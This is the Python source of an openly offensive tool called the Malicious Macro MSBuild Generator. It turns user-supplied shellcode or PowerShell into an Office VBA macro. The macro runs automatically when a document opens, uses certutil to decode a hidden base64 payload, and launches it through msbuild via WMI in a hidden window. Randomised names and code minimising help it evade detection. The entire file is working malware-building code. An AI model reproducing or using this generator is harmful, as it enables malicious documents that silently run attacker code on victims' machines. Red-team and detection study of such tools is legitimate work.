#!/usr/bin/python
import os
import re
import sys
import base64
import random
import string
import argparse

version = "1.0"

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

def gen_str():
	return ''.join(random.choice(string.letters) for i in range(random.randint(5,15)))

def minimize(output):
    output = re.sub(r'\s*\<\!\-\- .* \-\-\>\s*\n', '', output)
    output = output.replace('\n', '')
    output = re.sub(r'\s{2,}', ' ', output)
    output = re.sub(r'\s+([^\w])\s+', r'\1', output)
    output = re.sub(r'([^\w"])\s+', r'\1', output)

    variables = {
        'payload' : 'x',
        'method' : 'm',
        'asm' : 'a',
        'instance' : 'o',
        'pipeline' : 'p',
        'runspace' : 'r',
        'decoded' : 'd'
    }

    for k, v in variables.items():
        output = output.replace(k, v)

    return output

def generate_shellcode(filename):

	shellcode = ''

	if not os.path.exists(filename):
		print '[!] File Not Found'
		sys.exit(0)

	with open(filename) as f:
	   shellcode = bytes(bytearray(f.read()))
	   f.close()

	targetName = gen_str()

	template = open('templates/MSBuild_shellcode.csproj','r').read()

	msbuild = template.replace('[SHELLCODE]',base64.b64encode(shellcode)).replace('[TARGETNAME]',targetName)

	return msbuild

def generate_powershell(filename):

    powershell = ''

    if not os.path.exists(filename):
    	print '[!] File Not Found'
    	sys.exit(0)

    with open(filename, 'rb') as f:
      inp = f.read()
      powershell += inp

    ps = base64.b64encode(powershell)

    targetName = gen_str()

    template = open('templates/MSBuild_powershell.csproj','r').read()

    msbuild = template.replace('[POWERSHELL]',ps).replace('[TARGETNAME]',targetName)

    return msbuild

def generate_macro(msbuild_template):

	Method = gen_str()
	Str = gen_str()

	msbuild_encoded = base64.b64encode(minimize(msbuild_template))
	chunk = list(chunks(msbuild_encoded,80))

	macro = 'Dim fs As Object\n'
	macro += 'Dim TmpFolder As Object\n'
	macro += 'Dim env\n'
	macro += 'Dim cu\n'
	macro += 'Dim ecu as String\n'
	macro += 'Dim emsb as String\n'
	macro += 'Dim ex\n'
	macro += 'Dim msb\n'
	macro += 'Dim officeDir as String\n'
	macro += 'Dim msbPath as String\n'
	macro += 'Dim TmpFile\n'
	macro += 'Dim windir\n'
	macro += 'Dim wmsb As Object\n'
	macro += 'Dim strLocation As String\n\n'

	macro += 'Sub Auto_Open()\n'
	macro += '\t'+Method+'\n'
	macro += 'End Sub\n\n'
	macro += 'Sub AutoOpen()\n'
	macro += '\t'+Method+'\n'
	macro += 'End Sub\n\n'

	macro += 'Sub Document_Open()\n'
	macro += '\t'+Method+'\n'
	macro += 'End Sub\n\n'

	macro += "Public Function "+Method+"() As Variant\n"
	macro += '\tSet fs = CreateObject("Scripting.FileSystemObject")\n'
	macro += '\tSet TmpFolder = fs.GetSpecialFolder(2)\n\n'

	macro += '\tcu = "certutil"\n'
	macro += '\tex = "exe"\n'
	macro += '\tmsb = "msbuild"\n'
	macro += '\tenv = CStr(Environ("USERPROFILE"))\n'
	macro += '\twindir = CStr(Environ("WINDIR"))\n'
	macro += '\tofficeDir = env & "\AppData\Local\Microsoft\Office\\"\n'
	macro += '\tmsbPath = windir & "\Microsoft.NET\Framework\\v4.0.30319\\"\n'
	macro += '\tstrLocation = officeDir & "\\' + gen_str() + '.xml"\n'
	macro += '\tTmpFile = "\\' + gen_str() + '.txt"\n\n'

	payload = Str+" = \"" + str(chunk[0]) + "\"\n"
	for chk in chunk[1:]:
	    payload += "\t"+Str+" = "+Str+" + \"" + str(chk) + "\"\n"

	macro += '\t' + payload
	macro += '\n\tSet wmsb = fs.CreateTextFile(TmpFolder & TmpFile, True)\n'
	macro += '\twmsb.WriteLine ' + Str + '\n'
	macro += '\twmsb.Close\n\n'

	macro += '\tConst HIDDEN_WINDOW = 0\n'
	macro += '\tstrComputer = "."\n\n'

	macro += '\tecu = cu & strComputer & ex & " " & "-decode -f" & " " & TmpFolder & TmpFile & " " & strLocation\n\n'

	macro += '\tSet ObjWS = GetObject("winmgmts:\\\\" & strComputer & "\\root\cimv2")\n'
	macro += '\tSet objS = ObjWS.Get("Win32_ProcessStartup")\n'
	macro += '\tSet objC = objS.SpawnInstance_\n'
	macro += '\tobjC.ShowWindow = HIDDEN_WINDOW\n'
	macro += '\tSet objP = GetObject("winmgmts:\\\\" & strComputer & "\\root\cimv2:Win32_Process")\n'
	macro += '\tobjP.Create ecu, Null, objC, intProcessID\n\n'

	macro += '\temsb = msbPath & msb & strComputer & ex & " " & strLocation\n\n'

	macro += '\tSet ObjWS = GetObject("winmgmts:\\\\" & strComputer & "\\root\cimv2")\n'
	macro += '\tSet objS = ObjWS.Get("Win32_ProcessStartup")\n'
	macro += '\tSet objC = objS.SpawnInstance_\n'
	macro += '\tobjC.ShowWindow = HIDDEN_WINDOW\n'
	macro += '\tSet objP = GetObject("winmgmts:\\\\" & strComputer & "\\root\cimv2:Win32_Process")\n'
	macro += '\tobjP.Create emsb, Null, objC, intProcessID\n'
	macro += 'End Function\n'

	return macro


def output_file(filename,data):
	output = open(filename,"w")
	output.write(data)
	output.close()

if __name__ == "__main__":
   description = 'M3G - Malicious Macro MSBuild Generator v%s' % version
   description += '\nAuthor : Rahmat Nurfauzi (@infosecn1nja)'
   parser = argparse.ArgumentParser(description=description,formatter_class=argparse.RawTextHelpFormatter)
   parser.add_argument('-i','--inputfile', help='Input file you want to embed into the macro', required=True)   
   parser.add_argument('-p','--payload', help='Choose a payload for powershell or raw shellcode', required=True)
   parser.add_argument('-o','--output', help='Output filename for the macro', required=True)

   args = parser.parse_args()

   inputfile = args.inputfile
   payload = args.payload
   output = args.output

   msbuild_payload = ''

   if payload == 'shellcode':
      msbuild_payload = generate_shellcode(inputfile)
   elif payload == 'powershell':
      msbuild_payload = generate_powershell(inputfile)
   else:
      print '[!] Invalid type payload'
      sys.exit(0)

   macro = generate_macro(msbuild_payload)

   output_file(output,macro)